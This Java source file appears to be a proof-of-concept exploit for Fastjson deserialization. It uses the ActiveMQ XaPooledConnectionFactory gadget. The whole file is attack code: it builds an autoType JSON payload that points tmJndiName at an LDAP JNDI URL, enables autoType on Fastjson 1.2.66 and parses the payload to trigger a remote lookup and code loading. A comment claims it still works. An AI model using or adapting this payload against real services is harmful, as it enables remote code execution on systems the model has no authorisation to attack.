package fastjsonExp;

import org.apache.activemq.jms.pool.XaPooledConnectionFactory;
import utils.FastjsonVersionCtr;
import utils.StringUtils;

/**
 * 完成
 * org.apache.activemq.jms.pool
 * still work at fastjson 1.66
 */
public class EXP4apache_activemq_jms {
    //payload="{\"@type\":\"org.apache.activemq.jms.pool.XaPooledConnectionFactory\",\"tmJndiName\":\"ldap://127.0.0.1:1389/run\",\"TmFromJndi\":true}";
    public String JNDI_URL = "";
    public String payload = payload="{\"@type\":\"org.apache.activemq.jms.pool.XaPooledConnectionFactory\",\"tmJndiName\":\"replace_here\",\"TmFromJndi\":true}";
    public  void actual_fun(String url){
        XaPooledConnectionFactory x = new XaPooledConnectionFactory();
        x.setTmJndiName(url);
        x.setTmFromJndi(true);
        x.getTransactionManager();
    }
    public  void actual_fun(){
        if(!StringUtils.isNull(this.JNDI_URL)){
            actual_fun(this.JNDI_URL);
        }
    }
    public EXP4apache_activemq_jms(){}
    public EXP4apache_activemq_jms(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);
        System.out.println(this.payload);
    }
    public String getPayload(){
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.66");
        myFastjson.mySetAutoType(true);
        EXP4apache_activemq_jms exp = new EXP4apache_activemq_jms("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();
    }

}
